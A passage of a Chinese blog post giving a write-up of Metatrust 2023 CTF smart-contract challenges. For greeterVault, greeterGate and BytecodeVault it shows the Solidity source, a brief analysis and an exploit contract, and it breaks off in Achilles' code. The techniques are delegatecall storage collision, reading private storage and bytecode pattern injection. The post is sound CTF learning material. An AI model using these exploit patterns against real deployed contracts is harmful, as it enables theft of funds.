<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="一.greeterVault">
<meta property="og:type" content="article">
<meta property="og:title" content="Metatrust CTF">
<meta property="og:url" content="http://example.com/2023/11/08/Metatrust%202023ctf/index.html">
<meta property="og:site_name" content="scw&#39;s Blog">
<meta property="og:description" content="一.greeterVault">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-11-08T15:00:42.000Z">
<meta property="article:modified_time" content="2023-12-05T17:06:36.387Z">
<meta property="article:author" content="scw">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/2023/11/08/Metatrust%202023ctf/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/11/08/Metatrust%202023ctf/","path":"2023/11/08/Metatrust 2023ctf/","title":"Metatrust CTF"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Metatrust CTF | scw's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">scw's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-greeterVault"><span class="nav-number">1.</span> <span class="nav-text">一.greeterVault</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code"><span class="nav-number">1.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack"><span class="nav-number">1.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-greeterGate"><span class="nav-number">2.</span> <span class="nav-text">二.greeterGate</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-1"><span class="nav-number">2.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-1"><span class="nav-number">2.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89-BytecodeVault"><span class="nav-number">3.</span> <span class="nav-text">三.BytecodeVault</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-2"><span class="nav-number">3.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-2"><span class="nav-number">3.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B-Achilles"><span class="nav-number">4.</span> <span class="nav-text">四.Achilles</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-3"><span class="nav-number">4.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Interface-sol"><span class="nav-number">4.1.1.</span> <span class="nav-text">Interface.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PancakeSwap-sol"><span class="nav-number">4.1.2.</span> <span class="nav-text">PancakeSwap.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WETH-sol"><span class="nav-number">4.1.3.</span> <span class="nav-text">WETH.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Achilles-sol"><span class="nav-number">4.1.4.</span> <span class="nav-text">Achilles.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SetUp-sol"><span class="nav-number">4.1.5.</span> <span class="nav-text">SetUp.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-3"><span class="nav-number">4.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94-Who"><span class="nav-number">5.</span> <span class="nav-text">五.Who</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-4"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-4"><span class="nav-number">5.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-4"><span class="nav-number">5.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD-StakingPool"><span class="nav-number">6.</span> <span class="nav-text">六.StakingPool</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-5"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ERC20-sol"><span class="nav-number">6.1.1.</span> <span class="nav-text">ERC20.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ERC20V2-sol"><span class="nav-number">6.1.2.</span> <span class="nav-text">ERC20V2.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#StakingPools-MT-sol"><span class="nav-number">6.1.3.</span> <span class="nav-text">StakingPools_MT.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#StakingPoolsDeployment-sol"><span class="nav-number">6.1.4.</span> <span class="nav-text">StakingPoolsDeployment.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-5"><span class="nav-number">6.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-5"><span class="nav-number">6.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">6.3.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83-DeFiMaze"><span class="nav-number">7.</span> <span class="nav-text">七.DeFiMaze</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-6"><span class="nav-number">7.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SetUp-sol-1"><span class="nav-number">7.1.1.</span> <span class="nav-text">SetUp.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Vault-sol"><span class="nav-number">7.1.2.</span> <span class="nav-text">Vault.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DeFiPlatform-sol"><span class="nav-number">7.1.3.</span> <span class="nav-text">DeFiPlatform.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-6"><span class="nav-number">7.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-6"><span class="nav-number">7.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guessGame"><span class="nav-number">8.</span> <span class="nav-text">guessGame</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-7"><span class="nav-number">8.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-7"><span class="nav-number">8.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-7"><span class="nav-number">8.3.</span> <span class="nav-text">Attack</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">scw</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/08/Metatrust%202023ctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="scw">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="scw's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Metatrust CTF | scw's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Metatrust CTF
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-11-08 23:00:42" itemprop="dateCreated datePublished" datetime="2023-11-08T23:00:42+08:00">2023-11-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-12-06 01:06:36" itemprop="dateModified" datetime="2023-12-06T01:06:36+08:00">2023-12-06</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="一-greeterVault"><a href="#一-greeterVault" class="headerlink" title="一.greeterVault"></a>一.greeterVault</h3><span id="more"></span>

<h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract VaultLogic &#123;</span><br><span class="line"></span><br><span class="line">  address payable public owner;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    owner = payable(msg.sender);</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(bytes32 _password, address payable newOwner) public &#123;</span><br><span class="line">           if (password == _password) &#123;</span><br><span class="line">        owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> function withdraw() external &#123;</span><br><span class="line">           if (owner == msg.sender) &#123;</span><br><span class="line">          owner.transfer(address(this).balance);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  VaultLogic public logic;</span><br><span class="line"></span><br><span class="line">  constructor(address _logicAddress) payable &#123;</span><br><span class="line">    logic = VaultLogic(_logicAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(logic).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   receive() external payable &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SetUp &#123;</span><br><span class="line"></span><br><span class="line">    address public logic ;</span><br><span class="line"></span><br><span class="line">    address payable public vault;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) payable&#123;</span><br><span class="line">        VaultLogic logicCon = new VaultLogic(_password);</span><br><span class="line">        logic = address(logicCon);</span><br><span class="line">        Vault vaultCon = new Vault(logic);</span><br><span class="line">        vault = payable(address(vaultCon));</span><br><span class="line">        vault.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        return vault.balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题十分简单，考察的就是<code>delegatecall()</code>函数低级调用是在本合约环境执行调用的函数，只需要调用<code>changeOwner()</code>函数即可，需要注意的是，这里由于是在本合约环境执行，所以比较的<code>password</code>实际上是<code>Valut</code>合约中的<code>logic</code>变量</p>
<h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function attack() public&#123;</span><br><span class="line">    bytes memory data = abi.encodeWithSelector(</span><br><span class="line">      VaultLogic.changeOwner.selector,</span><br><span class="line">      0x00000000000000000000000056f8d532037695D3aA59a8E005811cd8c01F0268,</span><br><span class="line">      payable(address(this)));</span><br><span class="line">    vault.call(data);</span><br><span class="line">    bytes memory data2 = abi.encodeWithSelector(</span><br><span class="line">      VaultLogic.withdraw.selector</span><br><span class="line">    );</span><br><span class="line">    vault.call(data2);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="二-greeterGate"><a href="#二-greeterGate" class="headerlink" title="二.greeterGate"></a>二.greeterGate</h3><h4 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Gate &#123;</span><br><span class="line">        bool public locked = true;</span><br><span class="line"></span><br><span class="line">        uint256 public timestamp = block.timestamp;</span><br><span class="line">        uint8 private number1 = 10;</span><br><span class="line">        uint16 private number2 = 255;</span><br><span class="line">        bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32  _data1,bytes32  _data2,bytes32  _data3) &#123;</span><br><span class="line">     data[0] = _data1;</span><br><span class="line">     data[1] = _data2;</span><br><span class="line">     data[2] = _data3;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyThis() &#123;</span><br><span class="line">        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> function resolve(bytes memory _data) public &#123;</span><br><span class="line">          require(msg.sender != tx.origin);</span><br><span class="line">    (bool success, ) = address(this).call(_data);</span><br><span class="line">     require(success, &quot;call failed&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function unlock(bytes memory _data) public onlyThis &#123;</span><br><span class="line">       require(bytes16(_data) == bytes16(data[2]));</span><br><span class="line">      locked = false;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">            return !locked;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题考察的就是简单的内存布局，只需要懂内存布局，就可以知道<code>data[2]</code>存储在<code>slot 5</code>,读取值后构造一个<code>calldata</code>即可</p>
<h4 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">   Gate target;</span><br><span class="line">   bytes public calldat;</span><br><span class="line"></span><br><span class="line">   constructor(address _addr)&#123;</span><br><span class="line">      target = Gate(_addr);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function attack(bytes memory _data3) public&#123;</span><br><span class="line">      bytes memory _data = abi.encodeWithSelector(</span><br><span class="line">         Gate.unlock.selector,</span><br><span class="line">         _data3</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      target.resolve(_data);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三-BytecodeVault"><a href="#三-BytecodeVault" class="headerlink" title="三.BytecodeVault"></a>三.BytecodeVault</h3><h4 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.11;</span><br><span class="line"></span><br><span class="line">contract BytecodeVault &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyBytecode() &#123;</span><br><span class="line">        require(msg.sender != tx.origin, &quot;No high-level contracts allowed!&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external onlyBytecode &#123;</span><br><span class="line">        uint256 sequence = 0xdeadbeef;</span><br><span class="line">        bytes memory senderCode;</span><br><span class="line"></span><br><span class="line">        address bytecaller = msg.sender;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let size := extcodesize(bytecaller)</span><br><span class="line">            senderCode := mload(0x40)</span><br><span class="line">            mstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">            mstore(senderCode, size)</span><br><span class="line">            extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line">        require(senderCode.length % 2 == 1, &quot;Bytecode length must be even!&quot;);</span><br><span class="line">        for(uint256 i = 0; i &lt; senderCode.length - 3; i++) &#123;</span><br><span class="line">            if(senderCode[i] == byte(uint8(sequence &gt;&gt; 24))</span><br><span class="line">                &amp;&amp; senderCode[i+1] == byte(uint8((sequence &gt;&gt; 16) &amp; 0xFF))</span><br><span class="line">                &amp;&amp; senderCode[i+2] == byte(uint8((sequence &gt;&gt; 8) &amp; 0xFF))</span><br><span class="line">                &amp;&amp; senderCode[i+3] == byte(uint8(sequence &amp; 0xFF))) &#123;</span><br><span class="line">                msg.sender.transfer(address(this).balance);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(&quot;Sequence not found!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题就是要成功调用<code>withdraw()</code>函数即可，中间的一大段汇编只是在复制攻击合约的代码，之后进行检查代码长度是否为奇数，如果不是就加一些垃圾代码即可，在之后检查代码是否包含<code>0xdeadbeef</code>，只需要利用<code>constant</code>硬编码进字节码即可</p>
<h4 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bytes32 constant public b = bytes32(uint(0xdeadbeef));</span><br><span class="line">    uint256 constant public c = 2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function deploy(address _addr) public&#123;</span><br><span class="line">        BytecodeVault(_addr).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="四-Achilles"><a href="#四-Achilles" class="headerlink" title="四.Achilles"></a>四.Achilles</h3><h4 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h4><h5 id="Interface-sol"><a href="#Interface-sol" class="headerlink" title="Interface.sol"></a>Interface.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 